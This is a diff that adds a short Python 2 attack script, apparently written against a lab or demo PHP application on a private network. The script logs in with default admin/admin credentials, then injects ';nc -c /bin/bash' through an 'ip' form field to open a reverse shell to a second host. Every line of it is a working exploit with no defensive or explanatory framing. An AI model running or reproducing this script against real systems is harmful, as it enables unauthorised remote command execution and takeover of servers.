@@ -1,0 +1,12 @@
+import requests
+
+d = {'username' : 'admin' , 'password':'admin'}
+url = "http://192.168.1.3/demo/demo3.php"
+r = requests.get(url)
+c = r.cookies
+r = requests.post(url, data=d, cookies=c)
+url2="http://192.168.1.3/demo/demo4.php"
+cmd = ";nc -c /bin/bash 192.168.1.4 1234"
+d = {'ip': cmd}
+r = requests.post(url2, data=d, cookies=c)
+print r.text
